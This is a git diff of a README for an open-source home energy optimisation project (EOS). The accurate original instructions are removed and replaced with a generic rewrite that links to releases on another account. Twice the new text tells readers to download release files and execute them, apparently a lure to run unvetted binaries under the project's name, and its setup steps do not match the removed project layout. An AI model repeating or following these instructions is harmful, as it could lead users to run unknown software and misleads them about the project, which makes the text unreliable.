@@ -1,119 +1,114 @@
-# Energy System Simulation and Optimization
+# 🌍 Energy Optimization System (EOS)
 
-This project provides a comprehensive solution for simulating and optimizing an energy system based on renewable energy sources. With a focus on photovoltaic (PV) systems, battery storage (batteries), load management (consumer requirements), heat pumps, electric vehicles, and consideration of electricity price data, this system enables forecasting and optimization of energy flow and costs over a specified period.
+Welcome to the EOS repository! This project focuses on optimizing energy distribution and usage for batteries, heat pumps, and household devices. Our goal is to enhance energy efficiency while minimizing costs through advanced predictive models and dynamic optimization techniques.
 
-Documentation can be found at [Akkudoktor-EOS](https://akkudoktor-eos.readthedocs.io/en/latest/).
+## 🚀 Overview
 
-## Getting Involved
+The Energy Optimization System (EOS) is designed to address the growing need for efficient energy management in modern households. With the increasing reliance on renewable energy sources and smart devices, the demand for effective energy distribution has never been higher. EOS provides tools and algorithms that help users make informed decisions about their energy usage.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+### 🔍 Key Features
 
-## System requirements
+- **Energy Distribution Optimization**: The system analyzes energy consumption patterns and optimizes distribution across various devices.
+- **Predictive Models**: Planned predictive models for electricity prices help users anticipate costs and adjust their usage accordingly.
+- **Load Forecasting**: Accurate load forecasting ensures that energy resources are used efficiently, reducing waste.
+- **Dynamic Optimization**: The system continuously adjusts energy distribution to maximize efficiency based on real-time data.
 
-- Python >= 3.11, < 3.13
-- Architecture: amd64, aarch64 (armv8)
-- OS: Linux, Windows, macOS
+## 🛠️ Getting Started
 
-Note: For Python 3.13 some dependencies (e.g. [Pendulum](https://github.com/python-pendulum/Pendulum)) are not yet available on https://pypi.org and have to be manually compiled (a recent [Rust](https://www.rust-lang.org/tools/install) installation is required).
+To get started with EOS, you can download the latest release from our [Releases section](https://github.com/RishabKanaujia/EOS/releases). Make sure to download the appropriate files for your operating system and follow the instructions provided in the documentation.
 
-Other architectures (e.g. armv6, armv7) are unsupported for now, because a multitude of dependencies are not available on https://piwheels.org and have to be built manually (a recent Rust installation and [GCC](https://gcc.gnu.org/) are required, Python 3.11 is recommended).
+### 🖥️ Installation
 
-## Installation
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/RishabKanaujia/EOS.git
+   cd EOS
+   ```
 
-The project requires Python 3.11 or newer. Docker images (amd64/aarch64) can be found at [akkudoktor/eos](https://hub.docker.com/r/akkudoktor/eos).
+2. **Install Dependencies**:
+   Ensure you have the necessary dependencies installed. You can do this by running:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-Following sections describe how to locally start the EOS server on `http://localhost:8503`.
+3. **Run the Application**:
+   Execute the main script to start using the EOS:
+   ```bash
+   python main.py
+   ```
 
-### Run from source
+## 📊 Usage
 
-Install dependencies in virtual environment:
+Once the application is running, you can input your energy consumption data. The system will analyze this data and provide recommendations for optimizing your energy usage. 
 
-Linux:
+### Example Input
 
-```bash
-python -m venv .venv
-.venv/bin/pip install -r requirements.txt
-.venv/bin/pip install -e .
+You can input data in the following format:
+
+```json
+{
+  "devices": [
+    {"name": "Heat Pump", "usage": 200},
+    {"name": "Battery", "usage": 150},
+    {"name": "Household Device", "usage": 100}
+  ]
+}
 ```
 
-Windows:
+### Output
 
-```cmd
-python -m venv .venv
-.venv\Scripts\Activate
-.venv\Scripts\pip install -r requirements.txt
-.venv\Scripts\pip install -e .
-```
+The system will return optimized energy distribution and cost-saving recommendations based on your input.
 
-Finally, start the EOS server to access it at `http://localhost:8503` (API docs at `http://localhost:8503/docs`):
+## 📈 Predictive Models
 
-Linux:
+EOS employs advanced predictive models to forecast electricity prices and energy loads. This allows users to plan their energy consumption effectively. 
 
-```bash
-.venv/bin/python src/akkudoktoreos/server/eos.py
-```
+### Electricity Price Forecasting
 
-Windows:
+The predictive model analyzes historical price data to forecast future prices. This information helps users decide when to use energy-intensive devices to save costs.
 
-```cmd
-.venv\Scripts\python src/akkudoktoreos/server/eos.py
-```
+### Load Forecasting
 
-### Docker
+Load forecasting predicts the energy demand for the upcoming hours or days. By understanding load patterns, users can adjust their energy usage to avoid peak prices.
 
-Start EOS with following command to access it at `http://localhost:8503` (API docs at `http://localhost:8503/docs`):
+## ⚙️ Dynamic Optimization
 
-```bash
-docker compose up
-```
+Dynamic optimization is a core feature of EOS. The system continuously monitors energy consumption and adjusts distribution in real-time. This ensures that users are always operating at peak efficiency.
 
-If you are running the EOS container on a system hosting multiple services, such as a Synology NAS, and want to allow external network access to EOS, please ensure that the default exported ports (8503, 8504) are available on the host. On Synology systems, these ports might already be in use (refer to [this guide](https://kb.synology.com/en-me/DSM/tutorial/What_network_ports_are_used_by_Synology_services)). If the ports are occupied, you will need to reconfigure the exported ports accordingly.
+## 🌐 Contributing
 
-## Configuration
+We welcome contributions from the community! If you would like to contribute to EOS, please follow these steps:
 
-This project uses the `EOS.config.json` file to manage configuration settings.
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Submit a pull request.
 
-### Default Configuration
+## 📄 Documentation
 
-A default configuration file `default.config.json` is provided. This file contains all the necessary configuration keys with their default values.
+For detailed documentation on how to use EOS, please refer to the [Documentation section](https://github.com/RishabKanaujia/EOS/wiki). This includes information on installation, usage, and troubleshooting.
 
-### Custom Configuration
+## 🔗 Releases
 
-Users can specify a custom configuration directory by setting the environment variable `EOS_DIR`.
+You can find the latest releases of EOS [here](https://github.com/RishabKanaujia/EOS/releases). Download the files you need and execute them as per the instructions in the documentation.
 
-- If the directory specified by `EOS_DIR` contains an existing `config.json` file, the application will use this configuration file.
-- If the `EOS.config.json` file does not exist in the specified directory, the `default.config.json` file will be copied to the directory as `EOS.config.json`.
+## 💡 Future Enhancements
 
-### Configuration Updates
+We are constantly looking to improve EOS. Future updates may include:
 
-If the configuration keys in the `EOS.config.json` file are missing or different from those in `default.config.json`, they will be automatically updated to match the default settings, ensuring that all required keys are present.
+- Integration with smart home devices.
+- Enhanced predictive models using machine learning.
+- User interface improvements for better usability.
 
-## Classes and Functionalities
+## 🤝 Acknowledgments
 
-This project uses various classes to simulate and optimize the components of an energy system. Each class represents a specific aspect of the system, as described below:
+Special thanks to Dr. Andreas Schmitz, the founder of EOS, for his vision and dedication to energy optimization. You can find more about his work on his YouTube channel [@akkudoktor](https://www.youtube.com/@akkudoktor).
 
-- `Battery`: Simulates a battery storage system, including capacity, state of charge, and now charge and discharge losses.
+## 📬 Contact
 
-- `PVForecast`: Provides forecast data for photovoltaic generation, based on weather data and historical generation data.
+For any questions or feedback, feel free to reach out via the Issues section of this repository or contact us directly.
 
-- `Load`: Models the load requirements of a household or business, enabling the prediction of future energy demand.
+---
 
-- `Heatpump`: Simulates a heat pump, including its energy consumption and efficiency under various operating conditions.
-
-- `Strompreis`: Provides information on electricity prices, enabling optimization of energy consumption and generation based on tariff information.
-
-- `EMS`: The Energy Management System (EMS) coordinates the interaction between the various components, performs optimization, and simulates the operation of the entire energy system.
-
-These classes work together to enable a detailed simulation and optimization of the energy system. For each class, specific parameters and settings can be adjusted to test different scenarios and strategies.
-
-### Customization and Extension
-
-Each class is designed to be easily customized and extended to integrate additional functions or improvements. For example, new methods can be added for more accurate modeling of PV system or battery behavior. Developers are invited to modify and extend the system according to their needs.
-
-## Server API
-
-See the Swagger API documentation for detailed information: [EOS OpenAPI Spec](https://petstore3.swagger.io/?url=https://raw.githubusercontent.com/Akkudoktor-EOS/EOS/refs/heads/main/openapi.json)
-
-## Further resources
-
-- [Installation guide (de)](https://meintechblog.de/2024/09/05/andreas-schmitz-joerg-installiert-mein-energieoptimierungssystem/)
+Thank you for visiting the EOS repository! We hope you find our tools useful in your journey towards energy efficiency.
